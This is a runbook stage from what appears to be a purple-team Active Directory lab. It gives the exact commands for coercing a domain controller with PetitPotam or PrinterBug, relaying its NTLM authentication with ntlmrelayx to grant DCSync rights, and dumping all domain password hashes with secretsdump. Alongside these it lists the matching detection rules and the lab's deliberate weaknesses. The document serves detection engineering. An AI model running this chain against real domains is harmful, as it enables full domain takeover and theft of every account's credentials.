# Stage B2b: Coerced authentication -> NTLM relay -> DCSync rights abuse

**ATT&CK:** T1187 Forced Authentication, T1557.001 Adversary-in-the-Middle:
LLMNR/NBT-NS Poisoning and SMB Relay (the relay half applies even though
LLMNR itself isn't used here - see note below), T1003.006 OS Credential
Dumping: DCSync

## Why this replaces classic LLMNR/NBT-NS poisoning

Azure VNets do not support multicast or broadcast traffic, even within a
single subnet (confirmed in Microsoft's own VNet FAQ). LLMNR relies on
multicast (224.0.0.252) and NBT-NS on broadcast, so Responder/Inveigh-style
poisoning cannot reach a listener in this topology - there is no workaround
short of building a custom broadcast-relay overlay, which was considered
and deliberately not built (see `PLAN.md` discussion). PetitPotam and the
PrinterBug achieve a similar outcome - coercing a privileged machine
account into authenticating to an attacker-controlled listener - over
plain routed RPC/SMB (TCP 445), which works identically on Azure as
on-prem. This is also the more current real-world technique: many
hardened environments now disable LLMNR by policy specifically because of
Responder, which is exactly why red teams shifted toward coercion-based
relay attacks.

## Why this chain doesn't need AD CS

The well-known "PetitPotam to Domain Admin" path usually relays the
coerced DC authentication to AD Certificate Services web enrollment
(ESC8) to mint a certificate. This lab doesn't run AD CS, so instead the
coerced authentication is relayed to **DC01's own LDAP service**, using
the DC machine account's own privileges to grant an attacker-controlled
user the Active Directory replication rights needed for DCSync. No
certificate infrastructure required - just the DC, Impacket, and the
single-DC topology already built in Phase 2.

## Prerequisite: SACL for detection

Before running this, apply the Directory Service Access SACL (see
`ansible/roles/ad_domain/files/add-replication-audit-sacl.ps1`, run once
against the domain object) so the DCSync-rights-grant and the DCSync
itself actually generate Event ID 4662 - without it, this stage succeeds
but `detections/10-dcsync-rights-abuse.kql` has nothing to alert on.

## Steps (run from the WS01 foothold established in Stage A)

1. **Start the relay listener on WS01**, targeting DC01's LDAP service:
   ```
   ntlmrelayx.py -t ldap://10.10.2.10 --escalate-user <attacker-controlled-user>
   ```
   `--escalate-user` is the Impacket flag that uses the relayed session's
   privileges to grant the named AD user DCSync rights directly - no
   manual LDAP scripting needed.

2. **Trigger coercion against DC01**, pointed at WS01's IP, using either:
   - PetitPotam (MS-EFSRPC): `PetitPotam.py <ws01-ip> <dc01-ip>`
   - PrinterBug (MS-RPRN): `printerbug.py northwind.local/<user>:<pass>@<dc01-ip> <ws01-ip>`

3. **DC01's machine account authenticates (NTLM) to WS01's listener.**
   `ntlmrelayx` relays that session to DC01's LDAP service and grants the
   chosen user `DS-Replication-Get-Changes` and
   `DS-Replication-Get-Changes-All` on the domain object.

4. **Run DCSync** using the now-privileged user:
   ```
   secretsdump.py northwind.local/<attacker-controlled-user>:<pass>@10.10.2.10 -just-dc
   ```
   This dumps every domain account's password hash without ever touching
   LSASS on the DC directly - a meaningfully different detection surface
   than Stage B1's LSASS dump on WS01.

## What "success" looks like / expected detections

| Step | Detection file | What it watches for |
|---|---|---|
| Coercion call itself | `08-coercion-pipe-access.kql` | Sysmon Event 18 (pipe connected) to `\PIPE\efsrpc` or `\PIPE\spoolss` on DC01, sourced from WS01 rather than a normal admin workstation |
| Relayed NTLM auth | `09-ntlm-relay-dc-machine-account.kql` | Event 4624 (Logon Type 3) on WS01 where the account is DC01's own machine account (`DC01$`) - a DC authenticating *to* a workstation is itself anomalous |
| DCSync rights grant + DCSync itself | `10-dcsync-rights-abuse.kql` | Event 4662 with the replication extended-right GUIDs, `SubjectUserName` not a domain controller |

The third detection is the strongest signal in this entire project - it's
essentially the same mechanism Microsoft Defender for Identity's DCSync
alert uses, built here from plain Windows Security auditing instead of a
dedicated identity-security product.

## Honest limitations

- `08-coercion-pipe-access.kql` is a reasonable approximation, not a
  guaranteed catch - a well-written coercion tool can use named pipes in
  ways that don't always match this exact pattern. Treat it as one signal
  among several, not a sole source of truth.
- This chain assumes SMB signing / LDAP channel binding are not fully
  enforced (see `grc/risk-register.md` for this as a tracked, deliberate
  lab weakness) - a hardened real environment would block or complicate
  this relay at the protocol level before it ever reached the application
  layer.
